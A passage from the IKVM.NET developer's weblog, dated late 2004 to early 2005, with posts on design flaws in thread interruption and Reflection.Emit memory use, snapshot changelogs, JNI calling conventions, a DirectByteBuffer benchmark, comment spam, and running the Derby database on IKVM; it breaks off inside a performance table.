		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c2e84d9d-f369-4b85-ac6b-4fa931d2b006"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c2e84d9d-f369-4b85-ac6b-4fa931d2b006">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 03 January 2005</h2></div>
<div class="newsItems"><a name="a3218c285-f52e-4a7f-95ea-0ca6784bf29e"></a><div class="entry">
	<h3 class="entryTitle">Design Flaws</h3>
	<div class="entryBody">
		<P>Happy New Year!</P>
<P>The common theme in today's snapshot is clearly <I>design flaws</I>. I have two of my own to discuss and two others. Note that this reflects only an small portion of all design flaws in my (and other) code, but these are the ones that are at least mildly interesting to read about (I hope). </P>
<P><B>Thread.interrupt()</B></P>
<P>When I originally designed the <A href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/Thread.html#interrupt()">Thread.interrupt</A>() support, it seemed like an obvious thing to map this onto the .NET support for interrupting threads. In retrospect I can see that this was a mistake (when something seems obvious it's tempting not to think about it anymore), but at the time it appeared to work fairly well. Only after a while I discovered that the <I><A href="http://java.sun.com/docs/books/vmspec/2nd-edition/html/Instructions2.doc9.html">monitorenter</A></I> bytecode instruction (implemented by calling <A href="http://msdn.microsoft.com/library/en-us/cpref/html/frlrfsystemthreadingmonitorclassentertopic.asp">System.Threading.Monitor.Enter</A>()) wasn't supposed to be interruptable in Java. I "solved" this by redirecting <I>monitorenter</I> to <A href="http://cvs.sourceforge.net/viewcvs.py/ikvm/ikvm/runtime/ByteCodeHelper.cs?rev=1.8&amp;view=markup">ByteCodeHelper.monitorenter</A>() that repeatedly calls Monitor.Enter() (and catches any ThreadInterruptedExceptions) until it is successful. When I fixed this, I should have noticed a more fundamental problem with the Thread.interrupt() mapping approach, but I only realised the problem when I was working on the class loading deadlock bug a couple of weeks ago. Since java.lang.InterruptedException is a checked exception and can only occur in a couple of well defined places in the Java library, it simply wasn't a good fit to map it onto System.Threading.ThreadInterruptedException, which can occur any time a synchronized code block is entered (and this basically includes any .NET method).</P>
<P>Once I realised the problem, the fix was fairly easy. Java threads now maintain their own <I>interrupt pending</I> flag and whenever a Java thread enters one of the interruptable waits (Object.wait() or Thread.join()) it checks the flag and marks the thread as inside an interruptable wait. When another thread interrupts the waiting thread, it uses the .NET Thread.Interrupt() to interrupt the wait and the interrupted wait notices that the <I>interrupt pending</I> flag is set and catches the .NET System.Threading.ThreadInterruptedException and throws a java.lang.InterruptedException.</P>
<P><B>System.Reflection.Emit.MethodBuilder</B></P>
<P>I did some heap analysis on a started Eclipse process and discovered that a ridiculous amount of memory was being held by the various MethodBuilder instances that are kept alive by the IKVM type information data structures. This wasn't a matter of a couple of wasted bytes, but somewhere around 20MB of useless objects that were still being referenced. I attempted several different workarounds, but the simplest and safest one turned out to be using reflection to clear all of the unused private fields in MethodBuilder after a dynamic type is baked. This is obviously a nasty hack, but the resulting memory reduction is so significant that I felt it was worth it. <A href="http://lab.msdn.microsoft.com/productfeedback/viewfeedback.aspx?feedbackid=dea87860-58cf-4aaf-b882-3f6ecf5babb7">I filed a bug with Microsoft</A>, so hopefully it'll get fixed for Whidbey. Another reflection design flaw is that System.Reflection.Emit.OpCode is a value type that contains a whole bunch of instance fields, instead of a lightweight enum. This means that whenever you use an OpCode (which is often when you're generating code with ILGenerator) you are carrying around about 40 bytes, instead of an int sized value.</P>
<P><B>Hashtables</B></P>
<P>After getting rid of (most of) the MethodBuilder overhead, I turned my attention to my own code and noticed that a lot of memory was being used up by the hashtables that the TypeWrapper instances used for the fields and methods. Using hashtables for this turned out to be a design flaw, because most classes don't have that many types or fields that the memory overhead of a hashtable of worthwhile (I'm doing a simple linear search through an array now, and it doesn't affect performance at all). Besides this change I also made a whole bunch of other changes to reduce memory consumption, the result is that starting up Eclipse now takes less than half the heap space than it did in the previous snapshot.</P>
<P><B>C# and the CLS</B></P>
<P>The C# team uses the CLS as a (lame) excuse not to have to support accessing static fields in interfaces, so you cannot access Java interface fields in C#. To work around this, I've added code to create an inner class named __Fields to every interface that has static fields and that inner class contains duplicates of the interface fields, so that they can be accessed from C#.</P>
<P>Changes:</P>
<UL>
<LI>Sync'ed with GNU Classpath cvs (IKVM.GNU.Classpath now contains GNU JAXP XML processing library). You can now run Eclipse without having to add the xml stuff to the bootclasspath: <CODE>eclipse -vm c:\ikvm\bin\ikvm.exe</CODE></LI>
<LI>Moved ObjectHelper.wait() to VMThread.objectWait().</LI>
<LI>Moved ObjectHelper.toStringSpecial() to map.xml.</LI>
<LI>Removed java/lang/ObjectHelper.java</LI>
<LI>Removed remapping of System.Threading.ThreadInterruptedException to java.lang.InterruptedException.</LI>
<LI>Added code to set "user.language" and "user.region" system properties based on .NET culture.</LI>
<LI>Fixed two shutdown hooks bugs that could cause the shutdown hooks not to run or run very slowly.</LI>
<LI>Fixed Process.waitFor() to be interruptable.</LI>
<LI>Fixed bug in VMThread.join() that could cause it not to return when a native thread detaches the thread.</LI>
<LI>Totally rewrote Thread.interrupt() handling and detached Java thread interruption from .NET thread interruption.</LI>
<LI>Removed the MethodDescriptor class.</LI>
<LI>Removed ByteCodeHelper.monitorenter().</LI>
<LI>Changed class file parser to intern all class, field, method names and signatures.</LI>
<LI>Added check for class names that are too long for .NET to handle.</LI>
<LI>Changed class loading locking so that no locks (outside of the lock on the ClassLoader) are held when Java code is called, to prevent potential deadlocks.</LI>
<LI>Changed SimpleCallMethodWrapper and SmartCallMethodWrapper not to have two OpCode fields but use smaller enum type instead.</LI>
<LI>Changed field resolving/linking to use the same strategy as methods.</LI>
<LI>Unified NonPrimitiveValueTypeFieldWrapper, GhostFieldWrapper and SimpleFieldWrapper.</LI>
<LI>Changed compilation of synchronized instance methods to use MethodImplAttribute(MethodImplOptions.Synchronized).</LI>
<LI>Changed TypeWrapper to use simple arrays to store fields and methods, instead of hashtables.</LI>
<LI>Integrated lazy member publishing into TypeWrapper and removed LazyTypeWrapper.</LI>
<LI>Added BakedTypeCleanupHack to workaround bug/design flaw in Reflection.Emit that causes too much memory to be retained (the workaround is to use reflection to clear some private fields of MethodBuilder, ConstructorBuilder and FieldBuilder).</LI>
<LI>Added workaround to make interface fields usable from C# (by duplicating them in an inner class named __Fields in the interface).</LI>
<LI>Changed bytecode compiler to use CIL switch opcode for tableswitch bytecode (this is a bit more space efficient).</LI>
<LI>Added conv_i1, conv_i2, conv_i4 and conv_i8 instruction support to remapper.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/03/2005 18:11:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3218c285-f52e-4a7f-95ea-0ca6784bf29e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3218c285-f52e-4a7f-95ea-0ca6784bf29e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 22 December 2004</h2></div>
<div class="newsItems"><a name="a65da155f-a45e-46bf-8480-635c69fcdb77"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>More fixes and stabilization work. More to come...</P>
<P>Changes:</P>
<UL>
<LI>Merged with GNU Classpath cvs.</LI>
<LI>Fixed a relatively obscure bytecode compiler bug (that caused a "critical failure" because of an undefined label).</LI>
<LI>Fixed error handling for sockets to deal with closed sockets.</LI>
<LI>Implemented support for parsing relative ikvmres URLs and improved error handling.</LI>
<LI>Fixed ikvmres protocol handler to set port to -1 instead of 0 to enable better URL/URI roundtripping.</LI>
<LI>Fixed defineClass to throw NoClassDefFoundError instead of ClassNotFoundException (in some cases).</LI>
<LI>Fixed reflection to use a classes real accessibility instead of the access flags from the inner classes attribute.</LI>
<LI>Fixed ikvmc to always return errorcode when compilation fails.</LI>
<LI>Improved exception printing in ikvmstub.</LI>
<LI>Many fixes to class file format checking.</LI>
<LI>Fixed dynamic bytecode helper methods to throw NoClassDefFoundError instead of ClassNotFoundException.</LI>
<LI>Improved detection of class circularity.</LI>
<LI>Added workaround for .NET bug for classes that end with a period.</LI>
<LI>Implemented support for enums that use unsigned integral types as underlying type.</LI>
<LI>Fixed several constant field related bugs.</LI>
<LI>Fixed several .NET literal field related bugs.</LI>
<LI>Added workaround for .NET 1.1 verifier bug that made accessing the Value field of an enum unverifiable (for integral types smaller than Int32).</LI>
<LI>Fixed obscure bytecode compiler bug dealing with assigning uninitialized object references to local variables.</LI>
<LI>Implemented verifier checks to enforce calling the base class constructor before returning from a constructor.</LI>
<LI>Fixed obscure verifier bug that incorrectly disallowed having the unitialized this in a local or on the stack when doing a backward branch.</LI>
<LI>Fixed several verifier bugs when dealing with incorrect bytecode (would previously throw an IndexOutOfBoundsException instead of a VerifyError).</LI>
<LI>Added validation of the exception handling tables to the verifier and class file parser.</LI>
<LI>Implemented invokeinterface verification for bogus bytes following the instruction.</LI>
<LI>Moved java.lang.Class object &lt;-&gt; TypeWrapper mapping from hashtable to field in TypeWrapper.</LI>
<LI>Fixed class loading deadlocking bug.</LI>
<LI>Fixed JNI methods to handle RetargetedJavaExceptions.</LI>
<LI>Fixed Class.getProtectionDomain() for array types (not in Classpath cvs yet).</LI>
<LI>Fixed Class.getModifiers() for inner class array types.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/22/2004 09:40:49 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=65da155f-a45e-46bf-8480-635c69fcdb77"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=65da155f-a45e-46bf-8480-635c69fcdb77">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 13 December 2004</h2></div>
<div class="newsItems"><a name="a42da1751-bf3e-44df-a43a-e198d6a26c06"></a><div class="entry">
	<h3 class="entryTitle">Calling Conventions & New Snapshot</h3>
	<div class="entryBody">
		<P>Puneet Nayyar had some problems with JNI and was kind enough to send me that DLL that didn't work with IKVM. It turned out that the DLL exported a bunch of methods without the <A href="http://blogs.msdn.com/oldnewthing/archive/2004/01/08/48616.aspx">name decorations</A> that __stdcall (the JNICALL calling convention on Windows) requires. Originally I thought that the DLL used the __cdecl calling convention (which uses undecorated names, at least on the Visual Studio .NET 2003 C++ compiler, despite what Raymond Chen says), but an examination of the code showed that it did in fact pop the arguments of the stack. So the fix was trivial, just look up JNI methods in their undecorated form as well.</P>
<P>It worries me a little that this allows __cdecl methods to be found too (which is what you get when you forget the JNICALL modifier), because they would (most likely) result in a crash when called. The Sun JDK seems to (accidentally?) support the __cdecl calling convention, maybe they restore the stack pointer from EBP in their thunk.</P>
<P>Other changes:</P>
<UL>
<LI>Merged with GNU Classpath cvs. 
<LI>Fixed Class.forName() bugs when dealing with invalid array class names. 
<LI>Fixed Array.newInstance() when used on an unfinished class. 
<LI>Changed os.name and os.version system properties to be more compatible with Sun (on Windows). 
<LI>Changed ikvmc to allow building empty assemblies (mainly useful for creating executable that start a main method in an already compiled assembly). 
<LI>Fixed FileChannelImpl to use a smaller buffer (FileStream forces the use of a buffer, but we don't want any buffering at all). 
<LI>Fixed FileChannelImpl.write(int) to flush and handle exceptions. 
<LI>Fixed FileChannelImpl to handle (asynchronously) closed streams correctly. 
<LI>Fixed some weak reference bugs. 
<LI>Fixed ikvmc to use correct resource names on Mono (leading slash wasn't chopped off). 
<LI>Fixed JNI method lookup to support unmangled names. 
<LI>Cleaned up handling of VerifyError and log the error in the right place. 
<LI>Changed compilation "exception" trace messages to Error category (from Warning). 
<LI>Added compiler support for special casing VMSystem.arraycopy (which is now called directly by Classpath's StringBuffer implementation).</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/13/2004 08:56:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=42da1751-bf3e-44df-a43a-e198d6a26c06"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=42da1751-bf3e-44df-a43a-e198d6a26c06">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 02 December 2004</h2></div>
<div class="newsItems"><a name="ad0261858-9b7f-470d-9556-0816874645cb"></a><div class="entry">
	<h3 class="entryTitle">New Runtime -> Library Interface & New Snapshot</h3>
	<div class="entryBody">
		<P>The major new feature in this version is that I introduced a new interface (ikvm.internal.LibraryVMInterface) to replace all late-bound library operations in the runtime. In some cases this is a performance optimization, but I mainly did it to get better compile time checking.</P>
<P>In addition to that a&nbsp;number of small steps on the long road to 1.0:</P>
<UL>
<LI>Merged with GNU Classpath cvs.</LI>
<LI>Made the Field/Method/Constructor constructors package private. These objects are constructed from java.lang.VMClass but they live in java.lang.reflect, so they needed to be public, but I realised that since package private turns into assembly accessibility, I could use some map.xml glue to make factory methods in java.lang.VMClass that access the package private constructors in the java.lang.reflect package.</LI>
<LI>Fixed a whole bunch of DatagramSocket bugs.</LI>
<LI>Increased my Mauve test set enormously. I now run almost all Mauve tests. Current results: 238 of 3600422 tests failed.</LI>
<LI>Fixed FileChannelImpl.truncate to only truncate (not grow) the file.</LI>
<LI>Fixed several small java.io.File compatibility problems.</LI>
<LI>Fixed exception cleaning code to not skip package private methods.</LI>
<LI>Fixed a regression in ikvmc that caused it not to emit the names of method parameters.</LI>
<LI>Fixed regression that caused an exception when processing a constant boolean field.</LI>
<LI>Introduced ikvm.internal.LibraryVMInterface to replace all late binding from the runtime to the class library.</LI>
<LI>Added public API IKVM.Runtime.Util.MapException() to map exceptions from non-Java code.</LI>
<LI>Added ldobj instruction to remapper.cs.</LI>
<LI>Added a tools sub-project (currently only contains one simple app to generate an assembly reference for ilasm).</LI>
<LI>Implemented java.nio.channels.Channels.new[In|Out]putStream native methods.</LI>
<LI>Added stack trace cleaning to remove java.lang.LibraryVMInterfaceImpl methods.</LI>
<LI>Fixed some uncommon cross language Finalize method issues (e.g. when a Java class inherits from a C# class that inherits from Java class).</LI>
<LI>Optimized empty finalize methods. They are no longer registered as real Finalize methods.</LI>
<LI>Fixed reflection on .NET types to properly handle Java ghost interfaces.</LI>
<LI>Added a jvm sub-project to build JVM.DLL (Windows only).</LI>
<LI>Removed stub ikvm/classpath/gnu/java/net/protocol/ftp/Handler.java now that GNU Classpath has an ftp implementation.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/02/2004 10:09:11 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d0261858-9b7f-470d-9556-0816874645cb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d0261858-9b7f-470d-9556-0816874645cb">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 24 November 2004</h2></div>
<div class="newsItems"><a name="acd9f8602-a7c9-4a90-b307-5850b2039020"></a><div class="entry">
	<h3 class="entryTitle">Direct ByteBuffer, Inlining & New Snapshot</h3>
	<div class="entryBody">
		<P>Michael Koch finished Classpath's implementation of DirectByteBufferImpl. Direct ByteBuffers allow Java code to access unmanaged memory. You can allocate them from Java using <A href="http://java.sun.com/j2se/1.5.0/docs/api/java/nio/ByteBuffer.html#allocateDirect(int)">ByteBuffer.allocateDirect</A> or from JNI using <A href="http://java.sun.com/j2se/1.5.0/docs/guide/jni/spec/functions.html#new_direct_byte_buffer">NewDirectByteBuffer</A>. The default Classpath implementation uses native methods to implement accessing the buffer, but for IKVM I really didn't want to do it that way, because I like to use managed code whenever possible (for both maintainability and portability) and also because native method invocation is fairly slow. I therefore decided to reimplement gnu.classpath.RawData (the Classpath abstract native memory pointer) and java.nio.VMDirectByteBuffer.</P>
<P>At first RawData was a value type containing a single IntPtr field in an attempt to avoid an indirection when loading the pointer. This required that I replaced the implementation of DirectByteBufferImpl.get/put with some handwritten CIL instructions, because the compiled Java code resulted in unnecessarily boxing the RawData struct and that obviously killed performance. Since I was replacing the get and put methods anyway, I also inlined the index check and position update. After some experimentation I discovered that making RawData a value type didn't really help performance (the .NET JIT isn't very good at taking advantage of value type optimization opportunities) so I changed it into a reference type, this removed the need for special casing get and put, but when I removed the handcoded CIL performance went down significantly (approx. 50% slower). For some reason the JIT wasn't inlining the index check method, so I left the handcoded CIL in map.xml.</P>
<P>Here's a random microbenchmark:</P><PRE>import java.nio.*;
class DirectByteBuffer {
  public static void main(String[] args) {
    final int SIZE = 10 * 1024 * 1024;
    for(int j = 0; j &lt; 2; j++) {
      ByteBuffer b = ByteBuffer.allocateDirect(SIZE);
      long start = System.currentTimeMillis();
      for(int i = 0; i &lt; SIZE; i++)
        b.put(i, (byte)i);
      long sum = 0;
      for(int i = 0; i &lt; SIZE; i++)
        sum += b.get(i) &amp; 0xFF;
      long end = System.currentTimeMillis();
      System.out.println(end - start);
      System.out.println("sum = " + sum);
    }
  }
}</PRE>
<P>Results:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD colSpan=5>JRE 1.4.2 HotSpot Client VM</TD>
<TD>Average</TD></TR>
<TR>
<TD align=right>671</TD>
<TD align=right>530</TD>
<TD align=right>541</TD>
<TD align=right>521</TD>
<TD align=right>461</TD>
<TD align=right><B>545</B></TD></TR>
<TR>
<TD align=right>450</TD>
<TD align=right>461</TD>
<TD align=right>450</TD>
<TD align=right>460</TD>
<TD align=right>460</TD>
<TD align=right><B>456</B></TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD colSpan=5>JRE 1.5 HotSpot Client VM</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD align=right>401</TD>
<TD align=right>461</TD>
<TD align=right>411</TD>
<TD align=right>481</TD>
<TD align=right>480</TD>
<TD align=right><B>447</B></TD></TR>
<TR>
<TD align=right>410</TD>
<TD align=right>360</TD>
<TD align=right>441</TD>
<TD align=right>410</TD>
<TD align=right>411</TD>
<TD align=right><B>406</B></TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD colSpan=5>JRE 1.5 HotSpot Server VM</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD align=right>220</TD>
<TD align=right>120</TD>
<TD align=right>110</TD>
<TD align=right>120</TD>
<TD align=right>120</TD>
<TD align=right><B>138</B></TD></TR>
<TR>
<TD align=right>100</TD>
<TD align=right>110</TD>
<TD align=right>110</TD>
<TD align=right>160</TD>
<TD align=right>100</TD>
<TD align=right><B>116</B></TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD colSpan=5>IKVM on .NET 1.1</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD align=right>201</TD>
<TD align=right>231</TD>
<TD align=right>231</TD>
<TD align=right>240</TD>
<TD align=right>251</TD>
<TD align=right><B>231</B></TD></TR>
<TR>
<TD align=right>210</TD>
<TD align=right>210</TD>
<TD align=right>210</TD>
<TD align=right>221</TD>
<TD align=right>220</TD>
<TD align=right><B>214</B></TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD colSpan=5>IKVM on Mono 1.0.2 (--optimize=all)</TD>
<TD>&nbsp;</TD></TR>
<TR>
<TD align=right>430</TD>
<TD align=right>391</TD>
<TD align=right>400</TD>
<TD align=right>401</TD>
<TD align=right>390</TD>
<TD align=right><B>402</B></TD></TR>
<TR>
<TD align=right>401</TD>
<TD align=right>390</TD>
<TD align=right>401</TD>
<TD align=right>390</TD>
<TD align=right>401</TD>
<TD align=right><B>397</B></TD></TR></TBODY></TABLE>
<P><BR>Pretty good results. Most other operations perform similarly, except for compact, copy a large buffer takes about twice as long as on the JRE. The .NET class library really should have a memcpy or memmove method that is properly optimized. Note that there is CIL instruction cpblk to copy memory and I tried that as well, it is about 30% faster than my straightforward C# loop, but it doesn't handle overlapping regions and I didn't want to use an unverfiable instruction anyway (as that would cause IKVM.GNU.Classpath to fail verification and I use verification as simple smoke test during build to catch the most obvious regressions in the compiler).</P>
<P>I've also updated the Japi status results: <A href="http://www.frijters.net/IKVM-0.9-vs-JDK-1.4.html">IKVM vs JDK</A> and <A href="http://www.frijters.net/JDK-1.4-vs-IKVM-0.9.html">JDK vs IKVM</A>.</P>
<P>Other changes:</P>
<UL>
<LI>Resync'ed with GNU Classpath cvs.</LI>
<LI>Removed java/net/SocketInputStream.java and java/net/SocketOutputStream.java.</LI>
<LI>Moved contents of java/net/PlainSocketImpl.java to gnu/java/net/PlainSocketImpl.java.</LI>
<LI>Moved contents of java/net/PlainDatagramSocketImpl.java to gnu/java/net/PlainDatagramSocketImpl.java.</LI>
<LI>Added deprecated attribute to the three deprecated String methods.</LI>
<LI>Added deprecated attribute support to map.xml parser.</LI>
<LI>Added deprecated attribute support to ClassFileWriter.</LI>
<LI>Added deprecated attribute support to ikvmstub.</LI>
<LI>Added public API to query deprecatedness of fields, methods, constructors and classes.</LI>
<LI>Changed ikvmstub to emit serialVersionUID fields even if it is private, to make Japicompat status more accurate.</LI>
<LI>Added public API to query the constant value of a field.</LI>
<LI>Added ConstantValueAttribute to persist the constant value of constant instance fields (which are treated the same as static constant fields, by javac).</LI>
<LI>Added support to ikvmstub for constant instance fields.</LI>
<LI>Changed japi build file to generate both forward and backward compatibility reports.</LI>
<LI>Fixed runtime to support loading a pre-compiled Java class by referencing an ikvmstub generated stub class.</LI>
<LI>Fixed module names when generating -Xsave files.</LI>
<LI>Moved JNI method pointer field to proxy class when generating -Xsave files.</LI>
<LI>Replaced gnu.classpath.RawData with an IKVM specific version.</LI>
<LI>Added optimized special case implementation of several java.nio.DirectByteBufferImpl methods to map.xml.</LI>
<LI>Removed CharConversionException handlers from StringHelper (I fixed Classpath's character/string encoders/decoders to no longer throw exceptions).</LI>
<LI>ClassLoaderWrapper has a new method PublishLibraryImplementationHelperType to publish types that live in IKVM.Runtime.dll (this is used for the new gnu.classpath.RawData that lives in IKVM.Runtime.dll because it contains unverifiable code).</LI>
<LI>Improved line number table encoding (more space efficient and simpler code).</LI>
<LI>Implemented JNI methods NewDirectByteBuffer, GetDirectBufferAddress and GetDirectBufferCapacity.</LI>
<LI>Added new method AttributeHelper.SetEditorBrowsableNever to decorate methods with the EditorBrowsableAttribute (to prevent them from showing up in Intellisense).</LI>
<LI>Implemented support to override method implementations in map.xml (not implemented for constructors yet).</LI>
<LI>Renamed all of the IKVM introduced fields and methods to __&lt;xxx&gt;.</LI>
<LI>Added support for several new CIL instructions to remapper.cs.</LI>
<LI>Shadow types (e.g. the .NET java.lang.Object type) now hide all inherited methods and decorate them with EditorBrowsableAttribute(Never) so that they no longer show up in Intellisense.</LI>
<LI>I broke JNI.RegisterNatives in this snapshot (but it's fixed in cvs).</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/24/2004 13:56:56 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cd9f8602-a7c9-4a90-b307-5850b2039020"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cd9f8602-a7c9-4a90-b307-5850b2039020">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 09 November 2004</h2></div>
<div class="newsItems"><a name="ad894298f-d206-4883-acff-7ce06cb80467"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot. Nothing new, except that FileDescriptor.sync now actually works on Linux.</P>
<P>Thanks to lupus for reporting that it didn't work before.</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/09/2004 17:37:29 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d894298f-d206-4883-acff-7ce06cb80467"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d894298f-d206-4883-acff-7ce06cb80467">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a55ae9152-2376-49c8-9e91-177a7d364219"></a><div class="entry">
	<h3 class="entryTitle">Comment Spam</h3>
	<div class="entryBody">
		<P>Yesterday I disabled comments, because the comment spam was driving me nuts. I've now re-enabled them, but I've added a programming question that hopefully should be easy to answer for anyone wishing to comment, but too hard for the spammers to be worthwhile to figure out.</P>
<P>If you want to comment but don't know the answer to the question, feel free to e-mail me.</P>
<P>Sorry, for the inconvenience. :-(</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/09/2004 15:02:36 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=55ae9152-2376-49c8-9e91-177a7d364219"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=55ae9152-2376-49c8-9e91-177a7d364219">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 08 November 2004</h2></div>
<div class="newsItems"><a name="ac129dd0d-bfec-4465-9574-5275ab785238"></a><div class="entry">
	<h3 class="entryTitle">Running Derby on IKVM</h3>
	<div class="entryBody">
		<P>At the <A href="http://www.softwaresummit.com/">Colorado Software Summit</A> I attended a presentation on <A href="http://incubator.apache.org/derby/">Derby</A> by <A href="http://www.softwaresummit.com/2004/speakers/debrunner.htm">Dan Debrunner</A>. Derby is the open source version of IBM's Cloudscape database engine. After seeing the presentation I decided to try to run it on IKVM. I tried some simple tests and they all went fine. At the moment Derby doesn't include a test suite yet (IBM is working on releasing their tests), so I didn't do any extensive testing.</P>
<P>Since Derby is a real transactional database engine it uses a transaction log and requires FileDescriptor.sync() to work corectly, so I decided to implement that. I hadn't previously implemented it, because it unfortunately requires platform specific code, so it only works on Windows and on Posix systems (when running on Mono).</P>
<P>I wrote a very simple test app in C# (and the Java equivalent) and did some performance tests (download <A href="http://www.frijters.net/derby.zip">source</A>):</P>
<TABLE id=table1 border=1>
<TBODY>
<TR>
<TD>Operation</TD>
<TD>Sun JDK 1.5</TD>
<TD>IKVM/.NET 1.1</TD>
<TD>IKVM/Mono 1.0.2</TD></TR>
<TR>
